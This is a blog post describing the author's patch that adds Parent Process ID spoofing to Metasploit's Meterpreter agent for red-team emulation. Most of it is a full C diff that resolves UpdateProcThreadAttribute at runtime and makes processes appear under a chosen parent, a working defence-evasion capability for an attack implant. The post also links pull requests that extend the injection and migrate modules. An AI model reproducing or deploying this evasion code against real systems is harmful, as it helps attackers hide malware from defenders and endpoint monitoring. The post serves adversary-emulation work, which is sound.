---
layout: default
---

_**Dec 18, 2019**_

## Meterpreter + PPID Spoofing — Blending into the Target Environment

<script id="asciicast-O8NNimI7pwzrc00s3h3plSWkZ" src="https://asciinema.org/a/O8NNimI7pwzrc00s3h3plSWkZ.js" async></script>

The [Parent Process Identifier (PPID) Spoofing](https://attack.mitre.org/techniques/T1502/) is a quite fascinating technique since it enables malicious applications to spawn new processes under a different parent process ID. It is been used in the wild since ever to hide malware, especially when some kind of persistence is required. Let's see together how to implement this capability into the Meterpreter agent.

## Motivation

Very often commercial tools are the preferred option when Red Teams are tasked to emulate or simulate an Advanced Persistent Threat during Purple Team activities. Instead, I really believe that also _free and open source software™_ should offer the same capabilities, or at least very similar, in order to enable _everyone_ to reproduce MITRE's ATT&CK tactics. That's why I decided to implement the Parent Process Identifier (PPID) Spoofing evasion technique into the Meterpreter agent.

## Implementation

Let's make clear what our goals are:

1. First of all, we are going to use just C code to directly invoke Win32 APIs while a lot of public resources out there uses C# code instead.

2. Secondly, since we are editing an existing framework, we want to maintain retro-compatibility with the existing code, in order to not break any existing feature.

3. Thirdly, the Meterpreter agent already supports Windows operating systems from Windows XP and on and we want to maintain that support too, even if the required Win32 API to implement PPID Spoofing is not available in Windows XP itself.

Let's analyze the proposed changes in order to understand how those goals were met.

The first challenge that we encounter during the implementation is that the required [UpdateProcThreadAttribute](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-updateprocthreadattribute) Win32 API is not available before Windows Vista. For this reason we have to dinamically resolve at runtime the address of the function in order to check if it's available or not because linking it at compile time is not an option in this situation.

After that, we noticed that also a different data structure has to be passed to the [CreateProcess](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa) in order to properly request a different parent process ID. We can solve this issue by manually extending the original structure to support the new fields available in newer Windows versions.

We will manually extend the original `STARTUPINFOA` struct by declaring a `STARTUPINFOEXA` struct that includes the original one as its first member: with this _escamotage_, the original offsets to existing properties will be preserved and existing code will continue to work correctly. We can communicate to the operating system when extended startup information is available by specifing the `EXTENDED_STARTUPINFO_PRESENT` flag when creating the new process.

The final changes are the following:

```diff
diff --git a/c/meterpreter/source/extensions/stdapi/server/sys/process/process.c b/c/meterpreter/source/extensions/stdapi/server/sys/process/process.c
index 595f8ffe..9161dfd6 100644
--- a/c/meterpreter/source/extensions/stdapi/server/sys/process/process.c
+++ b/c/meterpreter/source/extensions/stdapi/server/sys/process/process.c
@@ -8,6 +8,30 @@
 typedef BOOL (STDMETHODCALLTYPE FAR * LPFNCREATEENVIRONMENTBLOCK)( LPVOID  *lpEnvironment, HANDLE  hToken, BOOL bInherit );
 typedef BOOL (STDMETHODCALLTYPE FAR * LPFNDESTROYENVIRONMENTBLOCK) ( LPVOID lpEnvironment );
 typedef BOOL (WINAPI * LPCREATEPROCESSWITHTOKENW)( HANDLE, DWORD, LPCWSTR, LPWSTR, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION );
+typedef BOOL (WINAPI * UPDATEPROCTHREADATTRIBUTE) (
+	LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList,
+	DWORD                        dwFlags,
+	DWORD_PTR                    Attribute,
+	PVOID                        lpValue,
+	SIZE_T                       cbSize,
+	PVOID                        lpPreviousValue,
+	PSIZE_T                      lpReturnSize
+);
+
+typedef BOOL (WINAPI* INITIALIZEPROCTHREADATTRIBUTELIST) (
+	LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList,
+	DWORD                        dwAttributeCount,
+	DWORD                        dwFlags,
+	PSIZE_T                      lpSize
+);
+
+typedef struct _STARTUPINFOEXA
+{
+	STARTUPINFOA StartupInfo;
+	LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList;
+} STARTUPINFOEXA, *LPSTARTUPINFOEXA;
+
+const int PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000;
 
 /*
  * Attaches to the supplied process identifier.  If no process identifier is
@@ -91,10 +116,10 @@ DWORD request_sys_process_execute(Remote *remote, Packet *packet)
 	Tlv inMemoryData;
 	BOOL doInMemory = FALSE;
 	PROCESS_INFORMATION pi;
-	STARTUPINFO si;
+	STARTUPINFOEXA si;
 	HANDLE in[2], out[2];
 	PCHAR path, arguments, commandLine = NULL;
-	DWORD flags = 0, createFlags = 0;
+	DWORD flags = 0, createFlags = 0, ppid = 0;
 	BOOL inherit = FALSE;
 	HANDLE token, pToken;
 	char * cpDesktop = NULL;
@@ -109,9 +134,10 @@ DWORD request_sys_process_execute(Remote *remote, Packet *packet)
 
 	// Initialize the startup information
 	memset( &pi, 0, sizeof(PROCESS_INFORMATION) );
-	memset( &si, 0, sizeof(STARTUPINFO) );
+	memset( &si, 0, sizeof(STARTUPINFOEXA) );
 
-	si.cb = sizeof(STARTUPINFO);
+	si.StartupInfo.cb = sizeof(STARTUPINFO);
+	si.lpAttributeList = NULL;
 
 	// Initialize pipe handles
 	in[0]  = NULL;
@@ -131,6 +157,7 @@ DWORD request_sys_process_execute(Remote *remote, Packet *packet)
 		arguments = packet_get_tlv_value_string(packet, TLV_TYPE_PROCESS_ARGUMENTS);
 		path = packet_get_tlv_value_string(packet, TLV_TYPE_PROCESS_PATH);
 		flags = packet_get_tlv_value_uint(packet, TLV_TYPE_PROCESS_FLAGS);
+		ppid = packet_get_tlv_value_uint(packet, TLV_TYPE_PARENT_PID);
 
 		if (packet_get_tlv(packet, TLV_TYPE_VALUE_DATA, &inMemoryData) == ERROR_SUCCESS)
 		{
@@ -154,7 +181,7 @@ DWORD request_sys_process_execute(Remote *remote, Packet *packet)
 
 				lock_release(remote->lock);
 
-				si.lpDesktop = cpDesktop;
+				si.StartupInfo.lpDesktop = cpDesktop;
 
 			} while (0);
 		}
@@ -232,10 +259,10 @@ DWORD request_sys_process_execute(Remote *remote, Packet *packet)
 			}
 
 			// Initialize the startup info to use the pipe handles
-			si.dwFlags |= STARTF_USESTDHANDLES;
-			si.hStdInput = in[0];
-			si.hStdOutput = out[1];
-			si.hStdError = out[1];
+			si.StartupInfo.dwFlags |= STARTF_USESTDHANDLES;
+			si.StartupInfo.hStdInput = in[0];
+			si.StartupInfo.hStdOutput = out[1];
+			si.StartupInfo.hStdError = out[1];
 			inherit = TRUE;
 			createFlags |= CREATE_NEW_CONSOLE;
 
@@ -251,8 +278,8 @@ DWORD request_sys_process_execute(Remote *remote, Packet *packet)
 		// If the hidden flag is set, create the process hidden
 		if (flags & PROCESS_EXECUTE_FLAG_HIDDEN)
 		{
-			si.dwFlags |= STARTF_USESHOWWINDOW;
-			si.wShowWindow = SW_HIDE;
+			si.StartupInfo.dwFlags |= STARTF_USESHOWWINDOW;
+			si.StartupInfo.wShowWindow = SW_HIDE;
 			createFlags |= CREATE_NO_WINDOW;
 		}
 
@@ -260,6 +287,52 @@ DWORD request_sys_process_execute(Remote *remote, Packet *packet)
 		if (flags & PROCESS_EXECUTE_FLAG_SUSPENDED)
 			createFlags |= CREATE_SUSPENDED;
 
+		// Set Parent PID if provided
+		if (ppid) {
+			dprintf("[execute] PPID spoofing\n");
+			HMODULE hKernel32Lib = LoadLibrary("kernel32.dll");
+			INITIALIZEPROCTHREADATTRIBUTELIST InitializeProcThreadAttributeList = (INITIALIZEPROCTHREADATTRIBUTELIST)GetProcAddress(hKernel32Lib, "InitializeProcThreadAttributeList");
+			UPDATEPROCTHREADATTRIBUTE UpdateProcThreadAttribute = (UPDATEPROCTHREADATTRIBUTE)GetProcAddress(hKernel32Lib, "UpdateProcThreadAttribute");
+			BOOLEAN inherit = packet_get_tlv_value_bool(packet, TLV_TYPE_INHERIT);
+			DWORD permission = packet_get_tlv_value_uint(packet, TLV_TYPE_PROCESS_PERMS);
+			HANDLE handle = OpenProcess(permission, inherit, ppid);
+			dprintf("[execute] OpenProcess: opened process %d with permission %d: 0x%p [%d]\n", ppid, permission, handle, GetLastError());
+			if (
+				handle &&
+				hKernel32Lib &&
+				InitializeProcThreadAttributeList &&
+				UpdateProcThreadAttribute
+			) {
+				size_t len = 0;
+				InitializeProcThreadAttributeList(NULL, 1, 0, &len);
+				si.lpAttributeList = malloc(len);
+				if (!InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &len)) {
+					printf("[execute] InitializeProcThreadAttributeList: [%d]\n", GetLastError());
+					result = GetLastError();
+					break;
+				}
+
+				dprintf("[execute] InitializeProcThreadAttributeList\n");
+
+				if (!UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &handle, sizeof(HANDLE), 0, 0)) {
+					printf("[execute] UpdateProcThreadAttribute: [%d]\n", GetLastError());
+					result = GetLastError();
+					break;
+				}
+
+				dprintf("[execute] UpdateProcThreadAttribute\n");
+
+				createFlags |= EXTENDED_STARTUPINFO_PRESENT;
+				si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
+
+				FreeLibrary(hKernel32Lib);
+			}
+			else {
+				result = GetLastError();
+				break;
+			}
+		}
+
 		if (flags & PROCESS_EXECUTE_FLAG_USE_THREAD_TOKEN)
 		{
 			// If there is an impersonated token stored, use that one first, otherwise
@@ -304,7 +377,7 @@ DWORD request_sys_process_execute(Remote *remote, Packet *packet)
 			}
 
 			// Try to execute the process with duplicated token
-			if (!CreateProcessAsUser(pToken, NULL, commandLine, NULL, NULL, inherit, createFlags, pEnvironment, NULL, &si, &pi))
+			if (!CreateProcessAsUser(pToken, NULL, commandLine, NULL, NULL, inherit, createFlags, pEnvironment, NULL, (STARTUPINFOA*)&si, &pi))
 			{
 				LPCREATEPROCESSWITHTOKENW pCreateProcessWithTokenW = NULL;
 				HANDLE hAdvapi32 = NULL;
@@ -342,14 +415,14 @@ DWORD request_sys_process_execute(Remote *remote, Packet *packet)
 						wcmdline = (wchar_t *)malloc((size + 1) * sizeof(wchar_t));
 						mbstowcs(wcmdline, commandLine, size);
 
-						if (si.lpDesktop)
+						if (si.StartupInfo.lpDesktop)
 						{
-							size = mbstowcs(NULL, (char *)si.lpDesktop, 0);
+							size = mbstowcs(NULL, (char *)si.StartupInfo.lpDesktop, 0);
 							if (size != (size_t)-1)
 							{
 								wdesktop = (wchar_t *)malloc((size + 1) * sizeof(wchar_t));
-								mbstowcs(wdesktop, (char *)si.lpDesktop, size);
-								si.lpDesktop = (LPSTR)wdesktop;
+								mbstowcs(wdesktop, (char *)si.StartupInfo.lpDesktop, size);
+								si.StartupInfo.lpDesktop = (LPSTR)wdesktop;
 							}
 						}
 
@@ -407,7 +480,7 @@ DWORD request_sys_process_execute(Remote *remote, Packet *packet)
 
 				if (session_id(GetCurrentProcessId()) == session || !hWtsapi32)
 				{
-					if (!CreateProcess(NULL, commandLine, NULL, NULL, inherit, createFlags, NULL, NULL, &si, &pi))
+					if (!CreateProcess(NULL, commandLine, NULL, NULL, inherit, createFlags, NULL, NULL, (STARTUPINFOA*)&si, &pi))
 					{
 						BREAK_ON_ERROR("[PROCESS] execute in self session: CreateProcess failed");
 					}
@@ -425,7 +498,7 @@ DWORD request_sys_process_execute(Remote *remote, Packet *packet)
 						BREAK_ON_ERROR("[PROCESS] execute in session: WTSQueryUserToken failed");
 					}
 
-					if (!CreateProcessAsUser(hToken, NULL, commandLine, NULL, NULL, inherit, createFlags, NULL, NULL, &si, &pi))
+					if (!CreateProcessAsUser(hToken, NULL, commandLine, NULL, NULL, inherit, createFlags, NULL, NULL, (STARTUPINFOA*)&si, &pi))
 					{
 						BREAK_ON_ERROR("[PROCESS] execute in session: CreateProcessAsUser failed");
 					}
@@ -453,7 +526,7 @@ DWORD request_sys_process_execute(Remote *remote, Packet *packet)
 		else
 		{
 			// Try to execute the process
-			if (!CreateProcess(NULL, commandLine, NULL, NULL, inherit, createFlags, NULL, NULL, &si, &pi))
+			if (!CreateProcess(NULL, commandLine, NULL, NULL, inherit, createFlags, NULL, NULL, (STARTUPINFOA*)&si, &pi))
 			{
 				result = GetLastError();
 				break;
@@ -531,6 +604,11 @@ DWORD request_sys_process_execute(Remote *remote, Packet *packet)
 		free(cpDesktop);
 	}
 
+	if (si.lpAttributeList)
+	{
+		free(si.lpAttributeList);
+	}
+
 	packet_transmit_response(result, remote, response);
 
 	return ERROR_SUCCESS;
```

## Results

After having implemented the feature in the core of the framework, we can update some existing modules in order to take advantage of the new capability, such as [shellcode_inject](https://github.com/rapid7/metasploit-framework/pull/12736/commits/cbd225dfed284935f5574cdaf0f84bd8bbc00b46), [payload_inject](https://github.com/rapid7/metasploit-framework/pull/12736/commits/664b196388656cf05d83189f612cebaa702a11f8) and the [migrate](https://github.com/rapid7/metasploit-framework/pull/12736/commits/f22c6f2f636eb8f61d4739e66591785a8d26fc31) module.

By enabling the latter to use this technique, we can automate the creation of a process with a spoofed parent process identifier (PPID) where to migrate to when a new Meterpreter agent checks in.
When the proposed Pull Requests ([1](https://github.com/rapid7/metasploit-payloads/pull/374) and [2](https://github.com/rapid7/metasploit-framework/pull/12736)) will be merged into the `master` branch, we will be able to reproduce the mentioned attacking technique using our favorite, well known, free and open source exploitation framework.

## Acknowledgements

Thanks to [@b4rtik](https://twitter.com/b4rtik) and [@splinter_code](https://twitter.com/splinter_code) for the help during debug sessions.

[back](../)
